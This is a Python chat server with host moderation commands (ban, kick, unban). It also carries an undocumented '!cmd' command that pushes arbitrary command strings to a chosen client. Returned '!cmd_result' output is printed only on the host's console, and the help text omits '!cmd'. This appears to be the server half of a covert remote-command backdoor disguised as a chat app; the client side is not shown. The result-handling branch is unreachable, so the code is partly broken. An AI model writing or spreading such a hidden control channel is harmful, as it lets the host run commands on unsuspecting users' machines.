import socket
import threading
import json
import os

ACCOUNTS_FILE = "server_accounts.json"
BANS_FILE = "banned_users.json"

clients = []
usernames = []
banned_users = []
host_username = None

def kick_user(username_to_kick):
    if username_to_kick in usernames:
        index = usernames.index(username_to_kick)
        client_socket = clients[index]
        client_socket.send("You have been kicked from the server.".encode('utf-8'))
        broadcast(f"{username_to_kick} has been kicked by the host.")
        remove_client(client_socket)
    else:
        print(f"User {username_to_kick} not found.")

def load_server_accounts():
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'r') as file:
            return json.load(file)
    return {}

def save_server_account(username):
    accounts = load_server_accounts()
    accounts[username] = {"joined": True}
    with open(ACCOUNTS_FILE, 'w') as file:
        json.dump(accounts, file)

def load_banned_users():
    if os.path.exists(BANS_FILE):
        with open(BANS_FILE, 'r') as file:
            return json.load(file)
    return []

def save_banned_users():
    with open(BANS_FILE, 'w') as file:
        json.dump(banned_users, file)

def broadcast(message, sender_socket=None):
    for client in clients:
        if client != sender_socket:
            try:
                client.send(message.encode('utf-8'))
            except:
                remove_client(client)

def remove_client(client_socket):
    if client_socket in clients:
        index = clients.index(client_socket)
        username = usernames[index]
        usernames.remove(username)
        clients.remove(client_socket)
        broadcast(f"{username} has left the chat.")
        client_socket.close()

def handle_host_commands(command, sender_socket):
    global banned_users

    if command.startswith("!ban "):
        username_to_ban = command.split()[1]
        if username_to_ban in usernames:
            banned_users.append(username_to_ban)
            save_banned_users()
            broadcast(f"{username_to_ban} has been banned by the host.")
            kick_user(username_to_ban)

    elif command.startswith("!unban "):
        username_to_unban = command.split()[1]
        if username_to_unban in banned_users:
            banned_users.remove(username_to_unban)
            save_banned_users()
            broadcast(f"{username_to_unban} has been unbanned by the host.")

    elif command.startswith("!kick "):
        username_to_kick = command.split()[1]
        kick_user(username_to_kick)

    elif command.startswith("!cmd "):
        parts = command.split(" ", 2)
        username = parts[1]
        cmd_command = parts[2]
        send_command_to_client(username, cmd_command)

    elif command.startswith("!help"):
        help_message = """
Host Commands:
!ban [username] - Ban a user from the server.
!unban [username] - Unban a previously banned user.
!kick [username] - Kick a user from the server.
!help - Display this help message.
"""
        sender_socket.send(help_message.encode('utf-8'))

def send_command_to_client(username, cmd_command):
    if username in usernames:
        index = usernames.index(username)
        client_socket = clients[index]
        client_socket.send(f"!cmd {cmd_command}".encode('utf-8'))

def handle_client(client_socket):
    global host_username
    try:
        client_socket.send("Enter your username: ".encode('utf-8'))
        username = client_socket.recv(1024).decode('utf-8')

        if username in banned_users:
            client_socket.send("You are banned from this server.".encode('utf-8'))
            client_socket.close()
            return

        if not host_username:
            host_username = username
            client_socket.send("You are the host and have admin privileges.".encode('utf-8'))

        accounts = load_server_accounts()
        if username in accounts:
            welcome_message = f"Welcome back, {username}!"
        else:
            welcome_message = f"Hello {username}, welcome to the chat for the first time!"
            save_server_account(username)

        usernames.append(username)
        clients.append(client_socket)

        broadcast(welcome_message, client_socket)
        broadcast(f"{username} has joined the chat.", client_socket)

        while True:
            message = client_socket.recv(1024).decode('utf-8')
            if message:
                if message.startswith("!"):
                    if username == host_username:
                        handle_host_commands(message, client_socket)
                    else:
                        client_socket.send("Only the host can run commands.".encode('utf-8'))
                elif message.startswith("!cmd_result "):
                    # Log the command result only on the host (server output)
                    result = message.split(" ", 1)[1]
                    print(f"Command result from {username}: {result}")
                else:
                    broadcast(f"{username}: {message}", client_socket)
    except:
        remove_client(client_socket)

def start_server():
    global banned_users
    banned_users = load_banned_users()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_ip = socket.gethostbyname(socket.gethostname())
    server_port = 9999
    server.bind((server_ip, server_port))
    server.listen(5)

    print(f"Server started on {server_ip}:{server_port}. Waiting for connections...")

    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        thread = threading.Thread(target=handle_client, args=(client_socket,))
        thread.start()

start_server()
